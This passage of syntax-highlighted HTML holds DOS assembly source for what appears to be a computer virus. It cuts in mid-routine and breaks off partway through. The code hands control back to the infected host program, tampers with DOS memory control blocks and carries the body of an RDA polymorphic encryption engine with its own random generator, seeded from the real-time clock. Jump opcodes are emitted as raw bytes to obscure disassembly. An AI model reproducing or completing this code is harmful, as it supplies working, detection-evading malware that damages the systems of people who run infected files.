         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+(</span><span class="sc5">ds__</span><span class="sc4">-</span><span class="sc5">ds_</span><span class="sc4">)],</span><span class="sc8">ds</span><span class="sc0">  </span><span class="sc1">; Store data segment</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DS = segment of environment segment</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Zero SI</span><span class="sc0">
</span><span class="sc5">find_zero</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; AX = two bytes of environment va...</span><span class="sc0">

         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; SI = offset within environment v...</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; End of environment variables?</span><span class="sc0">

         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_zero</span><span class="sc0">       </span><span class="sc1">; Not equal? Jump to find_zero</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">      </span><span class="sc1">; SI = offset of filename</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; DX =   "    "     "</span><span class="sc0">

         </span><span class="sc6">cli</span><span class="sc0">             </span><span class="sc1">; Clear interrupt-enable flag</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; AX = code segment</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; SS = stack segment</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc5">stack_ptr</span><span class="sc0">    </span><span class="sc1">; SP = offset of stack_ptr</span><span class="sc0">
         </span><span class="sc6">sti</span><span class="sc0">             </span><span class="sc1">; Set interrupt-enable flag</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0">        </span><span class="sc1">; Load and execute program</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">virus_exit__</span><span class="sc0">    </span><span class="sc1">; Error? Jump to virus_exit__</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4d00h</span><span class="sc0">        </span><span class="sc1">; Get return code (normal)</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">virus_exit__</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; ES = segment of environment segment</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc0">      </span><span class="sc1">; Free memory</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; AX = segment of PSP for current ...</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; AX = segment of current Memory C...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; ES = segment of Memory Control B...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc2">08h</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack (CS)</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc0">      </span><span class="sc1">; Terminate with return code</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">data_begin_</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">data__</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; this is the body of the rda algorithm. some part will be added and modified</span><span class="sc0">
</span><span class="sc1">; at runtime tho.</span><span class="sc0">
</span><span class="sc5">rda_basic_body</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rda_delta_offset_calc</span><span class="sc0">
</span><span class="sc5">rda_delta_off_sub</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">rda_first_dw_0</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">rda_second_dw_0</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; will contain length</span><span class="sc0">
</span><span class="sc5">rda_third_dw_0</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; will contain initial key</span><span class="sc0">
</span><span class="sc5">rda_fourth_dw_0</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; steps for rda_calculate_value_in_dx</span><span class="sc0">

</span><span class="sc5">rda_first_db_0</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; first execution mark if 0ffh, used</span><span class="sc0">
                    </span><span class="sc1">; to reinit rng from time to time</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">90h</span><span class="sc0">     </span><span class="sc1">; padding</span><span class="sc0">

</span><span class="sc5">rda_modulusv</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc5">rda_modulusv2</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">rda_sp_storage</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">off_to_table_2</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; will contain the offset to the part</span><span class="sc0">
                    </span><span class="sc1">; of the table_2 used</span><span class="sc0">
</span><span class="sc5">enc_dec_byte</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; 0 encrypting, 1 decrypting. used</span><span class="sc0">
                    </span><span class="sc1">; to reference the right rda_to_part_2</span><span class="sc0">
                    </span><span class="sc1">; table segment</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">90h</span><span class="sc0">

</span><span class="sc5">rnd_seed_1</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">; values for the rng</span><span class="sc0">
</span><span class="sc5">rnd_seed_2</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8Fh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">76h</span><span class="sc0">

</span><span class="sc5">rda_to_part_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">rda_to_part_1_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">rda_to_part_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">rda_to_part_2_end</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc5">rtc_comm_routine</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">     </span><span class="sc1">; send command to rtc passed in al</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">71h</span><span class="sc0">     </span><span class="sc1">; read response</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">         </span><span class="sc1">; call opcode</span><span class="sc0">


</span><span class="sc5">rda_get_datetime</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">0Eh</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc0">        </span><span class="sc1">; AT?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">get_data_with_rtc</span><span class="sc0">   </span><span class="sc1">; If the computer is an AT</span><span class="sc0">
                        </span><span class="sc1">; get system time through</span><span class="sc0">
                        </span><span class="sc1">; ports, otherwise get system</span><span class="sc0">
                        </span><span class="sc1">; time through interrupts</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11101001b</span><span class="sc0">       </span><span class="sc1">; JMP imm16 (opcode 0e9h)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">get_data_with_dos</span><span class="sc4">-</span><span class="sc5">get_data_with_rtc</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">get_data_with_rtc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; get seconds</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rtc_comm_routine</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">; get minutes</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rtc_comm_routine</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">; get hours (12 hours mode)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rtc_comm_routine</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">           </span><span class="sc1">; get day of week</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rtc_comm_routine</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11101001b</span><span class="sc0">       </span><span class="sc1">; JMP imm16 (opcode 0e9h)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">store_datetime</span><span class="sc4">-</span><span class="sc5">get_data_with_dos</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">get_data_with_dos</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ch</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">; DOS - GET CURRENT TIME</span><span class="sc0">

</span><span class="sc5">store_datetime</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rnd_seed_1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rnd_seed_2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">         </span><span class="sc1">; call opcode</span><span class="sc0">


</span><span class="sc5">random_value_with_modulus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; is limit 0? if so go away</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">continue_rngwm</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11101001b</span><span class="sc0">       </span><span class="sc1">; JMP imm16 (opcode 0e9h)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">rvwm_ret</span><span class="sc4">-</span><span class="sc5">continue_rngwm</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">continue_rngwm</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random_generator</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; and just limit it with our</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; desired value</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">no_need_to_div</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">no_need_to_div</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">rvwm_ret</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">             </span><span class="sc1">; call opcode</span><span class="sc0">

</span><span class="sc5">random_generator</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rnd_seed_1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rnd_seed_2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8405h</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">data_end_</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc0">       </span><span class="sc1">; End of data__</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rnd_seed_1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rnd_seed_2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">             </span><span class="sc1">; call opcode</span><span class="sc0">

</span><span class="sc5">rda_encdec_routine</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">enc_dec_byte</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">rda_decryption_stage</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11101001b</span><span class="sc0">       </span><span class="sc1">; JMP imm16 (opcode 0e9h)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">rda_encryption_stage</span><span class="sc4">-</span><span class="sc5">rda_decryption_stage</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">rda_decryption_stage</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_to_part_2</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; to mom instructions</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">off_to_table_2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_first_dw_0</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_first_dw_0</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_off_todi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11101001b</span><span class="sc0">       </span><span class="sc1">; JMP imm16 (opcode 0e9h)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">rda_prepare_forencdec</span><span class="sc4">-</span><span class="sc5">rda_encryption_stage</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">rda_encryption_stage</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_to_part_2</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; to reverse ones</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">off_to_table_2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_first_dw_0</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_off_todi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc5">rda_findbeginning</span><span class="sc4">:</span><span class="sc0">
